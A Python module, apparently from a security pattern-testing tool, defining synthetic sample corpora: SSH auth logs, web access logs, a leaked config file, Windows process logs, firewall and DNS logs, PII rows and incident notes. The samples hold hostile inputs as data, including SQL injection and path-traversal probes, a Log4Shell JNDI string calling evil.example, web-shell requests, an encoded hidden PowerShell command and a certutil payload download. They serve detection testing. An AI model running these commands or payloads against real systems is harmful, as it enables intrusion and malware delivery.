"""
Sample corpora.

Every tester ships with "The quick brown fox". A security tool should ship
with the text its users actually grep: auth logs, web access logs, a config
file with a secret in it, a PowerShell command line. Having real shapes one
click away is the difference between testing a pattern and admiring it.

All of it is synthetic. The addresses are from the documentation ranges
(RFC 5737, RFC 3849), the keys are the vendors' own published examples, and
the names are invented.
"""

from __future__ import annotations

from dataclasses import dataclass


@dataclass(frozen=True)
class Sample:
    id: str
    title: str
    blurb: str
    text: str


SSH = Sample("ssh", "Linux auth log", "sshd failures, successes and a sudo.", """\
Mar 11 09:14:58 gate sshd[24413]: Connection from 203.0.113.77 port 51422 on 10.0.4.12 port 22
Mar 11 09:14:59 gate sshd[24413]: Failed password for invalid user admin from 203.0.113.77 port 51422 ssh2
Mar 11 09:15:01 gate sshd[24413]: Failed password for invalid user admin from 203.0.113.77 port 51422 ssh2
Mar 11 09:15:03 gate sshd[24413]: Failed password for root from 203.0.113.77 port 51422 ssh2
Mar 11 09:15:05 gate sshd[24413]: Failed password for root from 198.51.100.8 port 40122 ssh2
Mar 11 09:15:06 gate sshd[24414]: Accepted publickey for deploy from 10.0.4.30 port 55120 ssh2: ED25519 SHA256:AbCdEf
Mar 11 09:15:09 gate sshd[24413]: error: maximum authentication attempts exceeded for root from 203.0.113.77 port 51422 ssh2 [preauth]
Mar 11 09:15:09 gate sshd[24413]: Disconnecting authenticating user root 203.0.113.77 port 51422: Too many authentication failures [preauth]
Mar 11 09:15:20 gate sshd[24421]: Accepted password for alice from 10.0.4.55 port 55302 ssh2
Mar 11 09:15:21 gate sudo: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
Mar 11 09:15:44 gate sshd[24430]: Failed password for invalid user healthcheck from 10.0.0.9 port 33001 ssh2
Mar 11 09:16:02 gate sshd[24431]: Invalid user oracle from 192.0.2.44 port 61002
Mar 11 09:16:02 gate sshd[24431]: Failed password for invalid user oracle from 192.0.2.44 port 61002 ssh2
""")

ACCESS = Sample("access", "Web access log", "Combined format, with probes in it.", """\
203.0.113.77 - - [11/Mar/2024:09:15:02 +0000] "GET / HTTP/1.1" 200 4021 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
203.0.113.77 - - [11/Mar/2024:09:15:04 +0000] "GET /admin HTTP/1.1" 404 199 "-" "Mozilla/5.0 (X11; Linux x86_64)"
198.51.100.8 - - [11/Mar/2024:09:15:11 +0000] "GET /index.php?id=1'%20OR%20'1'='1 HTTP/1.1" 500 512 "-" "sqlmap/1.7"
198.51.100.8 - - [11/Mar/2024:09:15:12 +0000] "GET /?q=1+UNION+ALL+SELECT+null,null,version() HTTP/1.1" 200 3312 "-" "sqlmap/1.7"
192.0.2.44 - - [11/Mar/2024:09:15:30 +0000] "POST /wp-login.php HTTP/1.1" 200 1200 "-" "python-requests/2.31.0"
192.0.2.44 - - [11/Mar/2024:09:15:31 +0000] "GET /../../etc/passwd HTTP/1.1" 400 226 "-" "curl/8.1.2"
192.0.2.44 - - [11/Mar/2024:09:15:33 +0000] "GET /cgi-bin/x?a=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D HTTP/1.1" 404 199 "-" "${jndi:ldap://evil.example/a}"
10.0.4.30 - - [11/Mar/2024:09:15:40 +0000] "GET /healthz HTTP/1.1" 200 2 "-" "kube-probe/1.28"
10.0.4.30 - - [11/Mar/2024:09:15:45 +0000] "GET /healthz HTTP/1.1" 200 2 "-" "kube-probe/1.28"
203.0.113.90 - - [11/Mar/2024:09:16:01 +0000] "POST /uploads/shell.php HTTP/1.1" 200 88 "-" "Mozilla/4.0"
203.0.113.90 - - [11/Mar/2024:09:16:02 +0000] "GET /uploads/shell.php?cmd=id HTTP/1.1" 200 44 "-" "Mozilla/4.0"
""")

SECRETS = Sample("secrets", "Config and source", "The things you hope are not committed.", """\
# deploy/settings.env  — checked in by mistake on 2024-03-04
DATABASE_URL=postgresql://appuser:Sup3rS3cret!@db.internal.example:5432/production
REDIS_URL=redis://cache.internal.example:6379/0
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
GITHUB_TOKEN=ghp_16C7e42F292c6912E7710c838347Ae178B4a
SLACK_WEBHOOK=https://hooks.slack.com/services/T00000000/B00000000/REDACTED-SYNTHETIC-EXAMPLE
SENTRY_DSN=https://examplePublicKey@o0.ingest.sentry.io/0
JWT_SIGNING_KEY=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJzeXN0ZW0ifQ.7bQ9mZ5oVv0kQmVQsQ1wXJm8k3g1z0YQb2cF4vQpLmA
DEBUG=false
ALLOWED_HOSTS=app.example.com,10.0.4.12
# TODO: move these to the secret manager before launch
API_KEY_PLACEHOLDER=changeme
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
-----END OPENSSH PRIVATE KEY-----
""")

WINDOWS = Sample("windows", "Windows process creation", "Sysmon-style command lines.", """\
2024-03-11T09:15:02.331Z EventID=1 Image=C:\\Windows\\System32\\cmd.exe CommandLine="cmd.exe /c whoami" User=CORP\\alice
2024-03-11T09:15:04.115Z EventID=1 Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe CommandLine="powershell.exe -NoP -W hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA" User=CORP\\alice
2024-03-11T09:15:06.882Z EventID=1 Image=C:\\Windows\\System32\\certutil.exe CommandLine="certutil.exe -urlcache -split -f http://203.0.113.77/a.exe C:\\Users\\alice\\AppData\\Local\\Temp\\a.exe" User=CORP\\alice
2024-03-11T09:15:09.004Z EventID=1 Image=C:\\Users\\alice\\AppData\\Local\\Temp\\a.exe CommandLine="a.exe" ParentImage=C:\\Windows\\System32\\certutil.exe User=CORP\\alice
2024-03-11T09:15:11.550Z EventID=13 TargetObject=HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater Details="C:\\Users\\alice\\AppData\\Local\\Temp\\a.exe"
2024-03-11T09:15:20.210Z EventID=1 Image=C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe CommandLine="chrome.exe --type=renderer" User=CORP\\bob
2024-03-11T09:15:31.700Z EventID=4625 Account=CORP\\svc_backup Workstation=WS-114 Status=0xC000006D LogonType=3
2024-03-11T09:15:33.902Z EventID=4624 Account=CORP\\svc_backup LogonType=3 SID=S-1-5-21-3623811015-3361044348-30300820-1013
2024-03-11T09:15:48.120Z EventID=1 Image=C:\\Windows\\System32\\rundll32.exe CommandLine="rundll32.exe C:\\Users\\alice\\AppData\\Roaming\\x.dll,DllMain" User=CORP\\alice
""")

FIREWALL = Sample("firewall", "Firewall and DNS", "Connections and lookups, mixed.", """\
2024-03-11T09:15:02Z fw01 action=allow proto=tcp src=10.0.4.55:51422 dst=142.250.185.78:443
2024-03-11T09:15:03Z fw01 action=deny proto=tcp src=203.0.113.77:51001 dst=10.0.4.12:3389
2024-03-11T09:15:03Z fw01 action=deny proto=tcp src=203.0.113.77:51002 dst=10.0.4.13:3389
2024-03-11T09:15:04Z fw01 action=deny proto=tcp src=203.0.113.77:51003 dst=10.0.4.14:3389
2024-03-11T09:15:07Z fw01 action=allow proto=udp src=10.0.4.55:50110 dst=10.0.4.1:53
2024-03-11T09:15:07Z dns01 query=updates.example.com type=A answer=93.184.216.34 client=10.0.4.55
2024-03-11T09:15:08Z dns01 query=kqxz3nfa9d7vv2q1.evil-domain.example type=TXT answer=NXDOMAIN client=10.0.4.55
2024-03-11T09:15:09Z dns01 query=a2f9b1c4e8d70a35.evil-domain.example type=TXT answer=NXDOMAIN client=10.0.4.55
2024-03-11T09:15:10Z dns01 query=cdn.example.net type=A answer=2001:db8:85a3::8a2e:370:7334 client=10.0.4.55
2024-03-11T09:15:22Z fw01 action=allow proto=tcp src=10.0.4.55:51500 dst=203.0.113.77:4444
2024-03-11T09:15:52Z fw01 action=allow proto=tcp src=10.0.4.55:51501 dst=203.0.113.77:4444
2024-03-11T09:16:22Z fw01 action=allow proto=tcp src=10.0.4.55:51502 dst=203.0.113.77:4444
""")

PII = Sample("pii", "Records to redact", "Personal data in an export.", """\
id,name,email,phone,card,note
1,Alice Fernsby,alice.fernsby@example.com,+441632960961,4111111111111111,renewed
2,Bram Okonkwo,b.okonkwo+billing@example.co.uk,+12025550143,5500005555555559,refunded
3,Chen Wei,chen.wei@example.org,+61255501234,378282246310005,disputed
4,Dara Nwosu,dara@example.net,+353015550123,6011111111111117,renewed
5,internal test,qa@example.com,+10000000000,0000000000000000,ignore this row
""")

MIXED = Sample("mixed", "Incident notes", "A report with defanged indicators.", """\
Initial access on 2024-03-11T09:15:02Z via hxxps://evil-domain[.]example/invoice.pdf.exe
Dropper hash (SHA-256): e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
Second stage beaconed to 203.0.113[.]77:4444 every 30 seconds — see CVE-2021-44228 for the entry vector.
Persistence via HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater (T1547.001).
Credential access attempted with certutil.exe; see technique T1105 for the transfer.
Exfil staged to hxxp://203.0.113[.]90/upload with a bearer token: Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.dBjftJeZ4CVPmB92K27uhbUJU1p1r_wW1gFWFOEjXk
Containment complete 2024-03-11T11:40:00Z. No RFC1918 lateral movement observed beyond 10.0.4.0/24.
""")

SAMPLES = (SSH, ACCESS, SECRETS, WINDOWS, FIREWALL, PII, MIXED)
BY_ID = {s.id: s for s in SAMPLES}
